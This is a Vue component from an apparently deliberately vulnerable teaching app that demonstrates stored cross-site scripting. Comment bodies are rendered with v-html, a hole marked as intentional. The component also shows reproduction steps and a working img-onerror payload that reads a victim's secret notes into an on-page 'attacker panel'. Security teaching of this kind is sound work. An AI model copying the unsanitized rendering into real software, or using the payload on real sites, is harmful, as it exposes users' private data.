<template>
  <div class="view-content">
    <h2 class="page-title">Issue 1: XSS</h2>
    <p class="page-subtitle">Stored Cross-Site Scripting via unsanitized comment rendering</p>

    <div v-if="task" class="card">
      <h3 style="margin-bottom:10px">{{ task.title }}</h3>
      <div class="task-meta" style="display:flex;gap:12px;margin-bottom:12px;font-size:12px;color:var(--text-muted)">
        <span>Status: <strong>{{ task.status }}</strong></span>
        <span>Priority: <strong>{{ task.priority }}</strong></span>
      </div>
      <div class="form-group">
        <label>Description</label>
        <p style="font-size:13px">{{ task.description }}</p>
      </div>
      <div v-if="task.secret_notes" class="form-group">
        <label>Secret Notes (visible to task owner only)</label>
        <p class="secret-notes-value" style="font-size:13px;color:var(--danger-text);font-style:italic">{{ task.secret_notes }}</p>
      </div>
    </div>

    <div v-if="task" class="card">
      <h3 style="margin-bottom:14px">Comments</h3>
      <ul id="comment-list" style="list-style:none;display:flex;flex-direction:column;gap:10px;margin-bottom:16px">
        <li v-for="c in task.comments" :key="c.id" style="border:1px solid var(--border);border-radius:4px;padding:10px 12px">
          <div style="font-size:11px;color:var(--text-muted);margin-bottom:6px">
            <strong>{{ c.username }}</strong> &mdash; {{ c.created_at }}
          </div>
          <!-- VULN: xss — v-html renders raw HTML from the API, including attacker-injected scripts -->
          <div v-html="c.body"></div>
        </li>
      </ul>

      <form @submit.prevent="submitComment" style="display:flex;flex-direction:column;gap:8px">
        <label>Add a comment</label>
        <textarea v-model="newComment" rows="3" placeholder="Write a comment..."></textarea>
        <div>
          <button type="submit" :disabled="!newComment.trim()">Post comment</button>
        </div>
      </form>
    </div>

    <div id="attacker-panel" class="attacker-panel">
      <h3>Attacker Panel</h3>
      <p style="font-size:13px;color:var(--text-muted)">Waiting for payload to fire...</p>
    </div>

    <div class="repro-block">
      <h3>Reproduction steps</h3>
      <ol style="padding-left:18px;line-height:2">
        <li>Log in as <strong>levi</strong> (the attacker)</li>
        <li>Paste the payload below into the comment box and submit</li>
        <li>Log out, then log in as <strong>alice</strong> (the victim)</li>
        <li>Navigate to this tab — the attacker panel above will show alice's captured secret notes</li>
      </ol>
      <div style="margin-top:12px">
        <label>Payload</label>
        <div style="display:flex;align-items:flex-start;gap:8px;margin-top:4px">
          <code style="flex:1;display:block;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-size:12px;word-break:break-all;white-space:pre-wrap">{{ payload }}</code>
          <button class="btn-secondary" style="flex-shrink:0" @click="copyPayload">{{ copied ? 'Copied!' : 'Copy' }}</button>
        </div>
      </div>
      <div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--repro-border)">
        <strong>Why the SPA is vulnerable:</strong>
        <p style="margin-top:6px;line-height:1.7">
          The SPA fetches comment bodies as raw strings from the JSON API and renders them with <code>v-html</code>,
          which sets <code>innerHTML</code> directly. The browser parses the injected HTML and executes any
          event handlers (like <code>onerror</code>) or <code>&lt;script&gt;</code> tags.
          This is architectural: the SPA trusts that data from its own API is safe, but the API stores
          whatever the commenter submitted with no sanitization.
        </p>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'

const task       = ref(null)
const newComment = ref('')
const copied     = ref(false)

const payload = `<img src=x onerror="setTimeout(function(){document.getElementById('attacker-panel').innerHTML='<h3>Attacker Panel</h3><p style=color:red><strong>CAPTURED secret_notes:</strong> '+(document.querySelector('.secret-notes-value')||{innerText:'(not found)'}).innerText+'</p>'},500)">`

onMounted(async () => {
  const res  = await fetch('http://localhost:5001/api/tasks/1', {
    headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
  })
  task.value = await res.json()
})

async function submitComment() {
  const body = newComment.value.trim()
  if (!body) return

  const res = await fetch('http://localhost:5001/api/comments', {
    method:  'POST',
    headers: {
      'Content-Type':  'application/json',
      'Authorization': `Bearer ${localStorage.getItem('token')}`,
    },
    body: JSON.stringify({ task_id: 1, body }),
  })
  if (res.ok) {
    const comment = await res.json()
    task.value.comments.push(comment)
    newComment.value = ''
  }
}

function copyPayload() {
  navigator.clipboard.writeText(payload)
  copied.value = true
  setTimeout(() => { copied.value = false }, 2000)
}
</script>
